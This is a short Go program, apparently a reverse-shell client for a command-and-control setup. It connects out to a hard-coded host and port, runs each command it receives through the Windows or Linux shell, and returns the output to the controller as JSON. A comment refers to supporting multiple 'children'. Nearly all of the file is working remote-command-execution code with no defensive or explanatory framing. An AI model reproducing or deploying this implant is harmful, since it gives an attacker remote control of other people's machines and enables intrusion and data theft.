package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

type Results struct {
	ID int
	//Command string
	Output string
}

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		// fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		// fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func main() {
	// arguments := os.Args
	// if len(arguments) == 1 {
	// 	fmt.Println("Please provide host:port.")
	// 	return
	// }
	// CONNECT := arguments[1]
	CONNECT := "127.0.0.1:9999"
	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}

	for {

		var results string
		// commandString, _ := bufio.NewReader(c).ReadString('\n')
		commandString := bufio.NewScanner(c)
		commandString.Scan()
		// 	fmt.Println(commandString.Text())
		// }

		fmt.Println("Command Received->: " + commandString.Text())
		if strings.TrimSpace(commandString.Text()) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
		// fmt.Println("CMD received->: ", commandString.Text())
		checkOS := OSCheck()
		if checkOS == "windows" {
			// fmt.Println("WINDOWS")
			CommandExec, err := exec.Command("cmd", "/C", commandString.Text()).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
				c.Write([]byte("unable to execute command"))
				continue
			}
			CommandExec2 := string(CommandExec)
			results = strings.TrimSpace(CommandExec2)
			// fmt.Println(reflect.TypeOf(CommandExec))
			// fmt.Println(reflect.TypeOf(err))

		} else if checkOS == "linux" {
			// fmt.Println("LINUX")
			//fmt.Println("XS", command)
			CommandExec, err := exec.Command(strings.TrimSpace(commandString.Text())).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
				c.Write([]byte("unable to execute command"))
				continue
			}
			CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
			results = strings.TrimSpace(CommandExec2)
		}
		// fmt.Println(results2)
		// results2 := [...]string{results, "END"}
		//writing
		// fmt.Fprintf(c, results2)

		//using the Results structure
		outputTest := &Results{
			ID:     1, // TODO: need to make this random for multiple children
			Output: results,
		}
		// jsonMS, _ := json.Marshal(outputTest)

		encoder := json.NewEncoder(c)
		encoder.Encode(outputTest)
		// decoder := json.NewDecoder(c)
		// decoder.Decode(&outputTest)
		fmt.Println("Encoded format:", outputTest)
		// results2 := jsonMS
		// fmt.Println(jsonMS)
		// c.Write([]byte(encoder))
		//fmt.Fprintf(c, results2)

	}
}
